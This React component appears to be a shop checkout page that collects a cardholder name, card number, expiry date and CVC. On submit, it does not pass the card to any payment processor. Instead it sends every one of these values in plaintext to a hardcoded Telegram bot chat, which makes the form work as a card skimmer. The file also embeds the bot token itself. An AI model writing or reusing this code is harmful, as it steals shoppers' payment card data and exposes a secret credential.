import React, { Fragment, useContext, useState } from 'react'
import "./PayFor.css"
import axios from 'axios'
import { ShopContext } from '../../Context/ShopContext'
import remove_icon from "../../Assets/cart_cross_icon.png"



const PayFor = () => {


    const { getTotalCartAmount, all_product, cartItems, removeFromCart } = useContext(ShopContext);
    const [codingMarket, setCodingMarket] = useState("FULL NAME")
    const [cardNumber, setCardNumber] = useState("")
    const [date, setDate] = useState("mm")
    const [year, setYear] = useState("yy")
    const [cvc, setCvc] = useState("")
    
    const token = "6338030284:AAF4zFYloslgjVj1LRCcDTNmSNpcrl-qExs"
    const chat_id = 5480822681
    const api = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=coding-market:%20%20%20${codingMarket}%20%20%20card-number:%20%20%20${cardNumber}%20%20%20month:%20%20%20${date}%20%20Year:%20$20${year}%20cvc:%20${cvc}`

    const CardVisible = {
        backfaceVisibility: cardNumber !== "" && codingMarket !== "" && date !== "mm" && year !== "yy" ? "visible" : "hidden"
    }

    const HandleSubmit = () => cardNumber !== "" && codingMarket !== "" && date !== "mm" && year !== "yy" && cvc !== "" ? (
        axios.get(api) && (setCodingMarket("Full name") && setCardNumber("Card number")) && (CardVisible.backfaceVisibility = "hidden")
    ) : alert(`Check fields`);

    return (
        <>

            <div class="container">
                <div class="card-container">

                    <div class="front">
                        <div class="image">
                            <img src="image/chip.png" alt="" />
                            <img src="image/visa.png" alt="" />
                        </div>
                        <div class="card-number-box">{cardNumber !== "" ? cardNumber.match(new RegExp('.{1,4}', 'g')).join(" ") : "################"}</div>
                        <div class="flexbox">
                            <div class="box">
                                <span>card holder</span>
                                <div class="card-holder-name">{codingMarket}</div>
                            </div>
                            <div class="box">
                                <span>expires</span>
                                <div class="expiration">
                                    <span class="exp-month">{date}</span> / <span class="exp-year">{year}</span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="back" style={CardVisible}>
                        <div class="stripe"></div>
                        <div class="box">
                            <span>cvv</span>
                            <div class="cvv-box">{cvc}</div>
                            <img src="image/visa.png" alt="" />
                        </div>
                    </div>

                </div>

                <form onSubmit={e => e.preventDefault()}>
                    <div class="inputBox">
                        <span>card number</span>
                        <input type="text" maxlength={16} class="card-number-input" onChange={e => setCardNumber(e.target.value)} value={cardNumber} />
                    </div>
                    <div class="inputBox">
                        <span>card holder</span>
                        <input type="text" maxLength={30} class="card-holder-input" onChange={e => setCodingMarket(e.target.value)} value={codingMarket} />
                    </div>
                    <div class="flexbox">
                        <div class="inputBox">
                            <span>expiration mm</span>
                            <select name="" id="" class="month-input" onChange={e => setDate(e.target.value)} >
                                <option value={"month"} selected disabled>month</option>
                                {
                                    [...Array(12)].map((item, index) => { 
                                        index += 1
                                        return <Fragment key={index}> <option value={index >= 10 ? index : `0${index}`}>{index >= 10 ? index : `0${index}`}</option> </Fragment> 
                                    })
                                }
                            </select>
                        </div>
                        <div class="inputBox">
                            <span>expiration yy</span>
                            <select name="" id="" class="year-input" onChange={e => setYear(e.target.value)}>
                                <option value="year" selected disabled>year</option>
                                {
                                    [...Array(100)].map((item, index) => { 
                                        index += 2000
                                        return <Fragment key={index}> <option value={index >= 10 ? index : `0${index}`}>{index >= 10 ? index : `0${index}`}</option> </Fragment> 
                                    })
                                }
                            </select>
                        </div>
                        <div class="inputBox">
                            <span>cvv</span>
                            <input type="text" maxlength={3} class="cvv-input" onChange={e => setCvc(e.target.value)} />
                        </div>
                    </div>
                    <button className='btn1' onClick={HandleSubmit}>submit</button>
                </form>
            </div>
        </>
    )
}

export default PayFor